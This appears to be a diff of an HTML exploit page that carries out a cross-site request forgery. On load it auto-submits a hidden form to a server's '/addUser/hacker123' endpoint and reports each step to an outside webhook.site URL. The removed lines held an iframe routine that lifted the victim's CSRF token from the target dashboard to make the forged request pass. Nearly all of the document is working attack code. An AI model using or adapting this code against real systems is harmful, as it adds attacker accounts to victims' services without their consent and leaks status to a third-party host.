@@ -2,52 +2,21 @@
 <html>
 <body>
   <form id="exploitForm" action="http://52.47.161.102:3000/api/teams/1/addUser/hacker123" method="POST">
-    <input type="hidden" name="csrfToken" id="csrfTokenInput">
+    <input type="hidden" name="csrfToken" id="csrfTokenInput" value="dummy">
     <input type="submit" id="installbutton" value="Install">
   </form>
   <script>
-    // Function to send webhook notification
     function sendWebhook(status, details) {
       fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
         method: 'POST',
         mode: 'cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ status, details, timestamp: new Date().toISOString() })
-      })
-      .catch(err => console.error('Webhook Error:', err.message));
+      });
     }
-
-    // Log script start
     sendWebhook('info', 'Script started');
-
-    // Use iframe to load dashboard
-    const iframe = document.createElement('iframe');
-    iframe.src = 'http://52.47.161.102:3000/';
-    iframe.style.display = 'none';
-    iframe.onload = () => {
-      try {
-        const doc = iframe.contentDocument || iframe.contentWindow.document;
-        const csrfTokenInput = doc.querySelector('input[name="csrfToken"]');
-        if (!csrfTokenInput) {
-          sendWebhook('failed', 'CSRF token input not found in iframe');
-          throw new Error('CSRF token input not found');
-        }
-        const csrfToken = csrfTokenInput.value;
-        if (!csrfToken) {
-          sendWebhook('failed', 'CSRF token value is empty');
-          throw new Error('CSRF token value is empty');
-        }
-        document.getElementById('csrfTokenInput').value = csrfToken;
-        document.getElementById('exploitForm').submit();
-        sendWebhook('success', 'Form submitted with CSRF token');
-      } catch (err) {
-        sendWebhook('failed', 'Iframe error: ' + err.message);
-      }
-    };
-    iframe.onerror = () => {
-      sendWebhook('failed', 'Iframe failed to load dashboard');
-    };
-    document.body.appendChild(iframe);
+    document.getElementById('exploitForm').submit();
+    sendWebhook('success', 'Form submitted');
   </script>
 </body>
 </html>
